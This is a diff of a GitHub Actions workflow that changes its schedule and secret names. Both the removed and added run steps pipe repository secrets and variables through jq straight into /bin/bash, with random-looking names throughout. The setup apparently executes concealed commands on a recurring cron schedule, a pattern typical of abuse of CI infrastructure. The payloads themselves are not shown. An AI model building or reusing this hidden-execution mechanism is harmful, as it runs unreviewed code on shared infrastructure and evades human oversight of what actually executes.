@@ -2,7 +2,7 @@ name: jiangpengying7612
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 5/6 * * *'
+    - cron: '38 3/6 * * *'
 
 jobs:
   build:
@@ -11,16 +11,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: jiangpengying7612
         env:
-          c91: ${{ secrets.c91 }}
+          dnnn87: ${{ secrets.dnnn87 }}
         run: |
-          echo $c91 | jq -r .ylug4 | /bin/bash
-          echo $q96 | jq -r .ckz10320 | /bin/bash
-          echo $alhy690 | jq -r .y0 | /bin/bash
-          echo $cmm6180 | jq -r .zxi5 | /bin/bash
-          echo $x9 | jq -r .fxglm91 | /bin/bash
-          echo $o60735 | jq -r .es0 | /bin/bash
-          echo $xsff07833 | jq -r .d63 | /bin/bash
-          echo $u42 | jq -r .ev949 | /bin/bash
-          echo $esq95 | jq -r .rnkvt89971 | /bin/bash
-          echo $nmlsq62741 | jq -r .y383 | /bin/bash
+          echo $dnnn87 | jq -r .nx1308 | /bin/bash
+          echo $hl940 | jq -r .ong20208 | /bin/bash
+          echo $tomg32778 | jq -r .kwkfd8231 | /bin/bash
 
